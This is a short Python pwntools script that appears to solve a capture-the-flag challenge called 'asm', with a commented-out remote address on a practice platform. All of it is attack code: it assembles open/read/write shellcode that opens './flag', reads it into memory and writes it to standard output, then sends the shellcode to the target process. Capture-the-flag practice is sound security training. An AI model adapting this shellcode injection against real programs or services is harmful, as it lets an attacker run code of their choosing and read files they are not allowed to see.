from pwn import *


context(os="linux", arch="amd64")
p = process("./asm")
# p =remote("node3.buuoj.cn", 28320)

ad = 0x41414000+0x100
code = shellcraft.open("./flag")
code += shellcraft.read(3, ad, 0x50)
code += shellcraft.write(1, ad, 0x50)
code = asm(code)

p.send(code)
p.interactive()
